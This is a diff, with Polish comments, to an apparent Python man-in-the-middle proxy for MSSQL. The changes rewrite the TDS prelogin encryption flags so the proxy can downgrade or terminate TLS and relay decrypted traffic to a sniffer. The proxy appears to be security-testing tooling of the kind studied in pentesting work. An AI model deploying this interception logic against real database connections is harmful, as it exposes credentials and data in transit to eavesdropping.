@@ -11,7 +11,6 @@
 #   https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/capture/mssql.rb
 #
 # do zrobienia:
-# - negocjaca (co jak jest loop wlaczony?)
 # - fragmentacja po TLS
 # - wlasna fabryka do wspoldzielenia danych - https://stackoverflow.com/questions/14848793/passing-parameters-to-twisted-factory-to-be-passed-to-session
 
@@ -81,10 +80,7 @@ class MSSQLServerProtocol(protocol.Protocol):
         self.tls_enabled = False
         self.key_pair = None
         self.cert = None
-
-        # czy to potrzebne?
         self.client_encryption_req = None
-        self.server_encryption_req = None
 
     def connectionMade(self):
         LOG.warning("incoming new connection")
@@ -189,10 +185,12 @@ class MSSQLServerProtocol(protocol.Protocol):
             self.before_prelogin = False
             prelogin = TDSPreLogin(data)
             self.client_encryption_req = prelogin.getEncryptionOption()
-            prelogin.setEncryptionOption(tds.TDS_ENCRYPT_NOT_SUP)
-            # wyłączanie szyfrowania - do negocjacji zrobic
-            #data=prelogin.data
-
+            if not Config.serverRequiresEncryption:
+                prelogin.setEncryptionOption(tds.TDS_ENCRYPT_NOT_SUP)
+                data=prelogin.data
+            else:
+                prelogin.setEncryptionOption(tds.TDS_ENCRYPT_REQ)
+                data=prelogin.data
         if self.client:
             self.client.write(data)
         else:
@@ -203,12 +201,23 @@ class MSSQLServerProtocol(protocol.Protocol):
         if self.tls_enabled:
             self.tls.sendall(data)
             data = self.tls.bio_read(4096)
+
+        packet = tds.TDSPacket(data)
+        if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['SPID'] == 0:
+            preloginResponse = TDSPreLogin(data)
+ 
+            if self.client_encryption_req == tds.TDS_ENCRYPT_ON or self.client_encryption_req == tds.TDS_ENCRYPT_REQ: 
+                preloginResponse.setEncryptionOption(tds.TDS_ENCRYPT_ON)
+                data = preloginResponse.data
+                LOG.info("client side: enabling TLS ")
+                self.tls_enabled = True
+
+            if self.client_encryption_req == tds.TDS_ENCRYPT_REQ or self.client_encryption_req == tds.TDS_ENCRYPT_NOT_SUP: 
+                preloginResponse.setEncryptionOption(tds.TDS_ENCRYPT_NOT_SUP)
+                data = preloginResponse.data             
+
         self.transport.write(data)
-        # tu i tak wiadomo ze to bedzie TDSresponse wiec nie sprawdzamy
-        if not self.before_prelogin and not self.tls_enabled:
-# tu uzaleznić od ENCRYPT - jak nie chce to nie włączać
-            LOG.info("client side: enabling TLS ")
-            self.tls_enabled = True
+
 
 class MSSQLClientProtocol(protocol.Protocol):
     def __init__(self):
@@ -254,17 +263,8 @@ class MSSQLClientProtocol(protocol.Protocol):
         packet = tds.TDSPacket(data)
         if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['SPID'] == 0:
             preloginResponse = TDSPreLogin(data)
-            self.factory.server.server_encryption_req = preloginResponse.getEncryptionOption()
-            # podmieniamy odpowiedz zeby klient myslal ze szyfrujemy 
-            if preloginResponse.getEncryptionOption() == tds.TDS_ENCRYPT_NOT_SUP:    
-                preloginResponse.setEncryptionOption(tds.TDS_ENCRYPT_ON)
-                data = preloginResponse.data
 
-            if preloginResponse.getEncryptionOption() == tds.TDS_ENCRYPT_REQ: 
-                LOG.error("server side: server require TLS, but client declared not supported - server disconnecting")   
-
-## nie zawsze to jest required
-            if preloginResponse.getEncryptionOption() == tds.TDS_ENCRYPT_ON: # and False: 
+            if (preloginResponse.getEncryptionOption() == tds.TDS_ENCRYPT_ON or preloginResponse.getEncryptionOption() == tds.TDS_ENCRYPT_REQ) and Config.serverRequiresEncryption: 
                 LOG.info("server side: TLS required - enabling") 
                 self.tls_enabled = True
                 try:
@@ -348,7 +348,8 @@ class Config:
     keyFile = None
     certFromFile = False
     key_pair = None
-    cert = None    
+    cert = None
+    serverRequiresEncryption = False
 
 #class MyServerFactory(protocol.ServerFactory):
 #    config = Config()
@@ -442,6 +443,17 @@ def getArgs():
     #LOG.warning("warning") # normal
     #LOG.info("info") # detailed
     #LOG.debug("debug") # debug 
+        
+def getServerEncryption():
+    ms_sql = tds.MSSQL(Config.serverAddr, Config.serverPort)
+    ms_sql.connect()
+    resp=ms_sql.preLogin()
+    if resp['Encryption'] == tds.TDS_ENCRYPT_REQ:
+        LOG.info("Server requires encryption!")
+        Config.serverRequiresEncryption=True
+    else:
+        LOG.info("Server DOES NOT require encryption!")
+    ms_sql.disconnect()
 
 def main():
     getArgs()
@@ -450,6 +462,8 @@ def main():
     logging.debug(version.getInstallationPath())
     
     show_banner()
+
+    getServerEncryption()
 
     if Config.loop:
         LOG.warning("Starting loop decrypted connection for proxy or sniffer on loopback interface\n[ client->0.0.0:%s-(decryption)->%s:%s->%s:%s-(encryption)->%s:%s ]",Config.listenPort,Config.clientLoopAddr,Config.clientLoopPort,Config.serverLoopAddr,Config.serverLoopPort,Config.serverAddr,Config.serverPort)
